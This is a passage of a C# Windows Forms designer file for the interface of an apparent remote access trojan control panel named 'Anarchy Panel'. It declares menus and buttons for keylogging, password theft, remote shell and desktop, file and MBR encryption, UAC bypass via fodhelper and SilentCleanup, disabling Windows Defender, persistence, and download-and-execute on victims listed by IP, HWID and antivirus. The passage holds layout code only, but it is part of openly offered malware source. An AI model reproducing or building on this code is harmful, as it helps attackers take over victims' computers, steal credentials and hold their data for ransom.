            this.lv_ip = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_country = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_group = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_hwid = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_user = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_os = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_ins = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_admin = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_av = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.contextMenuStrip = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.remoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.EncryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.DecryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mBRSettingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mBREncryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.RemoteShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.processManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.FileManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.keyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.passwordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.sToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SendFileToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.fromUrlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SendFileToDiskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SendFileToMemoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mergeregToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.executeVBSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem17 = new System.Windows.Forms.ToolStripMenuItem();
            this.fodhelperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SilentCleanupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.RunasToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem20 = new System.Windows.Forms.ToolStripMenuItem();
            this.DisableUACToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disableWDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ChatToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.startupTaskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem50 = new System.Windows.Forms.ToolStripMenuItem();
            this.addSheduleTaskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem51 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem52 = new System.Windows.Forms.ToolStripMenuItem();
            this.addToStartupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem53 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem57 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem40 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem41 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem42 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem43 = new System.Windows.Forms.ToolStripMenuItem();
            this.ClientControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.StopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.UpdateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.UninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ClientFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.guna2Panel3 = new Guna.UI2.WinForms.Guna2Panel();
            this.Pnlinfo = new Guna.UI2.WinForms.Guna2Panel();
            this.guna2Button3 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button2 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Panel4 = new Guna.UI2.WinForms.Guna2Panel();
            this.guna2TabControl2 = new Guna.UI2.WinForms.Guna2TabControl();
            this.tabPage5 = new System.Windows.Forms.TabPage();
            this.textBox1 = new Guna.UI2.WinForms.Guna2TextBox();
            this.label6 = new System.Windows.Forms.Label();
            this.guna2TabControl1 = new Guna.UI2.WinForms.Guna2TabControl();
            this.Tasks = new System.Windows.Forms.TabPage();
            this.guna2VScrollBar2 = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.listView2 = new System.Windows.Forms.ListView();
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Logs = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.contextMenuLogs = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.toolStripMenuItem27 = new System.Windows.Forms.ToolStripMenuItem();
            this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.Desktops = new System.Windows.Forms.TabPage();
            this.listView8 = new System.Windows.Forms.ListView();
            this.label11 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.guna2GradientPanel4 = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.label14 = new System.Windows.Forms.Label();
            this.pictureBox8 = new System.Windows.Forms.PictureBox();
            this.label13 = new System.Windows.Forms.Label();
            this.Guna2GradientPanel3 = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.label9 = new System.Windows.Forms.Label();
            this.pictureBox7 = new System.Windows.Forms.PictureBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.label7 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.pictureBox6 = new System.Windows.Forms.PictureBox();
            this.pictureBox3 = new System.Windows.Forms.PictureBox();
            this.label16 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.pictureBox9 = new System.Windows.Forms.PictureBox();
            this.label4 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.pictureBox5 = new System.Windows.Forms.PictureBox();
            this.label3 = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.Guna2GradientPanel1 = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.pictureBox11 = new System.Windows.Forms.PictureBox();
            this.label19 = new System.Windows.Forms.Label();
            this.pictureBox12 = new System.Windows.Forms.PictureBox();
            this.label20 = new System.Windows.Forms.Label();
            this.Guna2GradientPanel2 = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.label18 = new System.Windows.Forms.Label();
            this.label17 = new System.Windows.Forms.Label();
            this.pictureBox10 = new System.Windows.Forms.PictureBox();
            this.zzimageList1 = new System.Windows.Forms.ImageList(this.components);
            this.guna2Elipse4 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.listView3 = new System.Windows.Forms.ListView();
            this.contextMenuThumbnail = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.sTARTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sTOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.imgFlags = new System.Windows.Forms.ImageList(this.components);
            this.cLEARToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.guna2Elipse2 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.guna2Elipse3 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.guna2Elipse5 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.statusStrip1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter2)).BeginInit();
            this.tabControl1.SuspendLayout();
            this.guna2ContextMenuStrip2.SuspendLayout();
            this.guna2Panel1.SuspendLayout();
            this.guna2Panel2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).BeginInit();
            this.contextMenuStrip.SuspendLayout();
            this.guna2Panel3.SuspendLayout();
            this.Pnlinfo.SuspendLayout();
            this.guna2Panel4.SuspendLayout();
            this.guna2TabControl2.SuspendLayout();
            this.tabPage5.SuspendLayout();
            this.guna2TabControl1.SuspendLayout();
            this.Tasks.SuspendLayout();
            this.contextMenuLogs.SuspendLayout();
            this.Desktops.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.guna2GradientPanel4.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).BeginInit();
            this.Guna2GradientPanel3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox9)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).BeginInit();
            this.Guna2GradientPanel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox11)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox12)).BeginInit();
            this.Guna2GradientPanel2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox10)).BeginInit();
            this.contextMenuThumbnail.SuspendLayout();
            this.SuspendLayout();
            // 
            // statusStrip1
            // 
            this.statusStrip1.Dock = System.Windows.Forms.DockStyle.None;
            this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.statusStrip1.Location = new System.Drawing.Point(719, 160);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
            this.statusStrip1.Size = new System.Drawing.Size(158, 22);
            this.statusStrip1.TabIndex = 1;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // toolStripStatusLabel1
            // 
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(16, 17);
            this.toolStripStatusLabel1.Text = "...";
            // 
            // toolStripStatusLabel2
            // 
            this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
            this.toolStripStatusLabel2.Size = new System.Drawing.Size(130, 15);
            this.toolStripStatusLabel2.Text = "                    Notification";
            this.toolStripStatusLabel2.Click += new System.EventHandler(this.ToolStripStatusLabel2_Click);
            // 
            // ping
            // 
            this.ping.Enabled = true;
            this.ping.Interval = 30000;
            this.ping.Tick += new System.EventHandler(this.ping_Tick);
            // 
            // UpdateUI
            // 
            this.UpdateUI.Enabled = true;
            this.UpdateUI.Interval = 500;
            this.UpdateUI.Tick += new System.EventHandler(this.UpdateUI_Tick);
            // 
            // ThumbnailImageList
            // 
            this.ThumbnailImageList.ColorDepth = System.Windows.Forms.ColorDepth.Depth16Bit;
            this.ThumbnailImageList.ImageSize = new System.Drawing.Size(147, 144);
            this.ThumbnailImageList.TransparentColor = System.Drawing.Color.Transparent;
            // 
            // performanceCounter1
            // 
            this.performanceCounter1.CategoryName = "Processor";
            this.performanceCounter1.CounterName = "% Processor Time";
            this.performanceCounter1.InstanceName = "_Total";
            // 
            // performanceCounter2
            // 
            this.performanceCounter2.CategoryName = "Memory";
            this.performanceCounter2.CounterName = "% Committed Bytes In Use";
            // 
            // notifyIcon1
            // 
            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
            this.notifyIcon1.Text = "Anarchy Panel";
            this.notifyIcon1.Visible = true;
            // 
            // TimerTask
            // 
            this.TimerTask.Enabled = true;
            this.TimerTask.Interval = 5000;
            this.TimerTask.Tick += new System.EventHandler(this.TimerTask_Tick);
            // 
            // tabControl1
            // 
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage3);
            this.tabControl1.Controls.Add(this.tabPage4);
            this.tabControl1.Location = new System.Drawing.Point(1016, 239);
            this.tabControl1.Margin = new System.Windows.Forms.Padding(2);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(109, 26);
            this.tabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabControl1.TabIndex = 3;
            // 
            // tabPage1
            // 
            this.tabPage1.Location = new System.Drawing.Point(4, 22);
            this.tabPage1.Margin = new System.Windows.Forms.Padding(2);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(2);
            this.tabPage1.Size = new System.Drawing.Size(101, 0);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Clients";
            // 
            // tabPage3
            // 
            this.tabPage3.Location = new System.Drawing.Point(4, 22);
            this.tabPage3.Margin = new System.Windows.Forms.Padding(2);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Size = new System.Drawing.Size(101, 0);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "Screens";
            this.tabPage3.UseVisualStyleBackColor = true;
            // 
            // tabPage4
            // 
            this.tabPage4.Location = new System.Drawing.Point(4, 22);
            this.tabPage4.Margin = new System.Windows.Forms.Padding(2);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Padding = new System.Windows.Forms.Padding(2);
            this.tabPage4.Size = new System.Drawing.Size(101, 0);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "Auto Task";
            this.tabPage4.UseVisualStyleBackColor = true;
            // 
            // listView4
            // 
            this.listView4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.listView4.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView4.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader4,
            this.columnHeader5});
            this.listView4.ContextMenuStrip = this.guna2ContextMenuStrip2;
            this.listView4.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.listView4.ForeColor = System.Drawing.Color.White;
            this.listView4.FullRowSelect = true;
            this.listView4.HideSelection = false;
            this.listView4.Location = new System.Drawing.Point(0, 0);
            this.listView4.Margin = new System.Windows.Forms.Padding(2);
            this.listView4.Name = "listView4";
            this.listView4.Size = new System.Drawing.Size(880, 282);
            this.listView4.TabIndex = 0;
            this.listView4.UseCompatibleStateImageBehavior = false;
            this.listView4.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "Task";
            this.columnHeader4.Width = 279;
            // 
            // columnHeader5
            // 
            this.columnHeader5.Text = "Run times";
            this.columnHeader5.Width = 601;
            // 
            // guna2ContextMenuStrip2
            // 
            this.guna2ContextMenuStrip2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2ContextMenuStrip2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2ContextMenuStrip2.ImageScalingSize = new System.Drawing.Size(29, 29);
            this.guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.downloadExecuteToolStripMenuItem,
            this.downloadAndExecuteToolStripMenuItem,
            this.persistenceDefeatUACToolStripMenuItem,
            this.persistenceDefeatWDToolStripMenuItem,
            this.updateAllClientsToolStripMenuItem,
            this.dELETETASKToolStripMenuItem});
            this.guna2ContextMenuStrip2.Margin = new System.Windows.Forms.Padding(3);
            this.guna2ContextMenuStrip2.Name = "guna2ContextMenuStrip1";
            this.guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
            this.guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
            this.guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.Black;
            this.guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.guna2ContextMenuStrip2.Size = new System.Drawing.Size(208, 136);
            // 
            // downloadExecuteToolStripMenuItem
            // 
            this.downloadExecuteToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.downloadExecuteToolStripMenuItem.Name = "downloadExecuteToolStripMenuItem";
            this.downloadExecuteToolStripMenuItem.Size = new System.Drawing.Size(207, 22);
            this.downloadExecuteToolStripMenuItem.Text = "Download & Execute";
            this.downloadExecuteToolStripMenuItem.Click += new System.EventHandler(this.downloadExecuteToolStripMenuItem_Click);
            // 
            // downloadAndExecuteToolStripMenuItem
            // 
            this.downloadAndExecuteToolStripMenuItem.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F);
            this.downloadAndExecuteToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.downloadAndExecuteToolStripMenuItem.Name = "downloadAndExecuteToolStripMenuItem";
            this.downloadAndExecuteToolStripMenuItem.Size = new System.Drawing.Size(207, 22);
            this.downloadAndExecuteToolStripMenuItem.Text = "Browse & Execute";
            this.downloadAndExecuteToolStripMenuItem.Click += new System.EventHandler(this.downloadAndExecuteToolStripMenuItem_Click_1);
            // 
            // persistenceDefeatUACToolStripMenuItem
            // 
            this.persistenceDefeatUACToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.persistenceDefeatUACToolStripMenuItem.Name = "persistenceDefeatUACToolStripMenuItem";
            this.persistenceDefeatUACToolStripMenuItem.Size = new System.Drawing.Size(207, 22);
            this.persistenceDefeatUACToolStripMenuItem.Text = "Persistence  Defeat UAC";
            this.persistenceDefeatUACToolStripMenuItem.Click += new System.EventHandler(this.persistenceDefeatUACToolStripMenuItem_Click);
            // 
            // persistenceDefeatWDToolStripMenuItem
            // 
            this.persistenceDefeatWDToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.persistenceDefeatWDToolStripMenuItem.Name = "persistenceDefeatWDToolStripMenuItem";
            this.persistenceDefeatWDToolStripMenuItem.Size = new System.Drawing.Size(207, 22);
            this.persistenceDefeatWDToolStripMenuItem.Text = "Persistence  Defeat WD";
            this.persistenceDefeatWDToolStripMenuItem.Click += new System.EventHandler(this.persistenceDefeatWDToolStripMenuItem_Click);
            // 
            // updateAllClientsToolStripMenuItem
            // 
            this.updateAllClientsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.updateAllClientsToolStripMenuItem.Name = "updateAllClientsToolStripMenuItem";
            this.updateAllClientsToolStripMenuItem.Size = new System.Drawing.Size(207, 22);
            this.updateAllClientsToolStripMenuItem.Text = "Update all clients";
            this.updateAllClientsToolStripMenuItem.Click += new System.EventHandler(this.updateAllClientsToolStripMenuItem_Click);
            // 
            // dELETETASKToolStripMenuItem
            // 
            this.dELETETASKToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.dELETETASKToolStripMenuItem.Name = "dELETETASKToolStripMenuItem";
            this.dELETETASKToolStripMenuItem.Size = new System.Drawing.Size(207, 22);
            this.dELETETASKToolStripMenuItem.Text = "Delete";
            this.dELETETASKToolStripMenuItem.Click += new System.EventHandler(this.DELETETASKToolStripMenuItem_Click);
            // 
            // guna2Panel1
            // 
            this.guna2Panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2Panel1.Controls.Add(this.Guna2CircleProgressBar2);
            this.guna2Panel1.Controls.Add(this.guna2Button8);
            this.guna2Panel1.Controls.Add(this.guna2Button7);
            this.guna2Panel1.Controls.Add(this.guna2Button6);
            this.guna2Panel1.Controls.Add(this.guna2Button4);
            this.guna2Panel1.Controls.Add(this.btnHide);
            this.guna2Panel1.Controls.Add(this.btnShow);
            this.guna2Panel1.Controls.Add(this.guna2Button5);
            this.guna2Panel1.Controls.Add(this.guna2Button9);
            this.guna2Panel1.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(72)))), ((int)(((byte)(75)))));
            this.guna2Panel1.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
            this.guna2Panel1.Dock = System.Windows.Forms.DockStyle.Left;
            this.guna2Panel1.Location = new System.Drawing.Point(0, 0);
            this.guna2Panel1.Name = "guna2Panel1";
            this.guna2Panel1.Size = new System.Drawing.Size(59, 460);
            this.guna2Panel1.TabIndex = 27;
            // 
            // Guna2CircleProgressBar2
            // 
            this.Guna2CircleProgressBar2.Animated = true;
            this.Guna2CircleProgressBar2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.Guna2CircleProgressBar2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(50)))));
            this.Guna2CircleProgressBar2.FillThickness = 10;
            this.Guna2CircleProgressBar2.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.Guna2CircleProgressBar2.ForeColor = System.Drawing.Color.White;
            this.Guna2CircleProgressBar2.Location = new System.Drawing.Point(12, 5);
            this.Guna2CircleProgressBar2.Minimum = 0;
            this.Guna2CircleProgressBar2.Name = "Guna2CircleProgressBar2";
            this.Guna2CircleProgressBar2.ProgressColor = System.Drawing.Color.Magenta;
            this.Guna2CircleProgressBar2.ProgressColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(126)))), ((int)(((byte)(106)))), ((int)(((byte)(231)))));
            this.Guna2CircleProgressBar2.ProgressEndCap = System.Drawing.Drawing2D.LineCap.Round;
            this.Guna2CircleProgressBar2.ProgressStartCap = System.Drawing.Drawing2D.LineCap.Round;
            this.Guna2CircleProgressBar2.ProgressThickness = 10;
            this.Guna2CircleProgressBar2.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
            this.Guna2CircleProgressBar2.Size = new System.Drawing.Size(36, 36);
            this.Guna2CircleProgressBar2.TabIndex = 56;
            this.Guna2CircleProgressBar2.Value = 70;
            // 
            // guna2Button8
            // 
            this.guna2Button8.Animated = true;
            this.guna2Button8.BackColor = System.Drawing.Color.Transparent;
            this.guna2Button8.BorderRadius = 4;
            this.guna2Button8.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Button8.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2Button8.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2Button8.ForeColor = System.Drawing.Color.White;
            this.guna2Button8.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button8.Image")));
            this.guna2Button8.Location = new System.Drawing.Point(16, 421);
            this.guna2Button8.Name = "guna2Button8";
            this.guna2Button8.Size = new System.Drawing.Size(24, 28);
            this.guna2Button8.TabIndex = 54;
            this.guna2Button8.UseTransparentBackground = true;
            this.guna2Button8.Click += new System.EventHandler(this.guna2Button8_Click_1);
            // 
            // guna2Button7
            // 
            this.guna2Button7.Animated = true;
            this.guna2Button7.BackColor = System.Drawing.Color.Transparent;
            this.guna2Button7.BorderRadius = 4;
            this.guna2Button7.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Button7.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2Button7.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2Button7.ForeColor = System.Drawing.Color.White;
            this.guna2Button7.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button7.Image")));
            this.guna2Button7.Location = new System.Drawing.Point(16, 420);
            this.guna2Button7.Name = "guna2Button7";
            this.guna2Button7.Size = new System.Drawing.Size(24, 28);
            this.guna2Button7.TabIndex = 53;
            this.guna2Button7.UseTransparentBackground = true;
            this.guna2Button7.Visible = false;
            this.guna2Button7.Click += new System.EventHandler(this.guna2Button7_Click_1);
            // 
            // guna2Button6
            // 
            this.guna2Button6.Animated = true;
            this.guna2Button6.BackColor = System.Drawing.Color.Transparent;
            this.guna2Button6.BorderRadius = 4;
            this.guna2Button6.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Button6.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2Button6.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2Button6.ForeColor = System.Drawing.Color.White;
            this.guna2Button6.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button6.Image")));
            this.guna2Button6.Location = new System.Drawing.Point(6, 276);
            this.guna2Button6.Name = "guna2Button6";
            this.guna2Button6.Size = new System.Drawing.Size(46, 47);
            this.guna2Button6.TabIndex = 52;
            this.guna2Button6.UseTransparentBackground = true;
            this.guna2Button6.Click += new System.EventHandler(this.guna2Button6_Click);
            this.guna2Button6.MouseLeave += new System.EventHandler(this.guna2Button6_MouseLeave);
            this.guna2Button6.MouseHover += new System.EventHandler(this.guna2Button6_MouseHover);
            // 
            // guna2Button4
            // 
            this.guna2Button4.Animated = true;
            this.guna2Button4.BackColor = System.Drawing.Color.Transparent;
            this.guna2Button4.BorderRadius = 4;
            this.guna2Button4.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Button4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2Button4.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2Button4.ForeColor = System.Drawing.Color.White;
            this.guna2Button4.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button4.Image")));
            this.guna2Button4.Location = new System.Drawing.Point(6, 223);
            this.guna2Button4.Name = "guna2Button4";
            this.guna2Button4.Size = new System.Drawing.Size(46, 47);
            this.guna2Button4.TabIndex = 51;
            this.guna2Button4.UseTransparentBackground = true;
            this.guna2Button4.Click += new System.EventHandler(this.guna2Button4_Click);
            // 
            // btnHide
            // 
            this.btnHide.Animated = true;
            this.btnHide.BackColor = System.Drawing.Color.Transparent;
            this.btnHide.BorderRadius = 4;
            this.btnHide.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.btnHide.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.btnHide.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnHide.ForeColor = System.Drawing.Color.White;
            this.btnHide.Image = ((System.Drawing.Image)(resources.GetObject("btnHide.Image")));
            this.btnHide.Location = new System.Drawing.Point(6, 129);
            this.btnHide.Name = "btnHide";
            this.btnHide.Size = new System.Drawing.Size(46, 47);
            this.btnHide.TabIndex = 49;
            this.btnHide.UseTransparentBackground = true;
            this.btnHide.Click += new System.EventHandler(this.btnHide_Click);
            // 
            // btnShow
            // 
            this.btnShow.Animated = true;
            this.btnShow.BackColor = System.Drawing.Color.Transparent;
            this.btnShow.BorderRadius = 4;
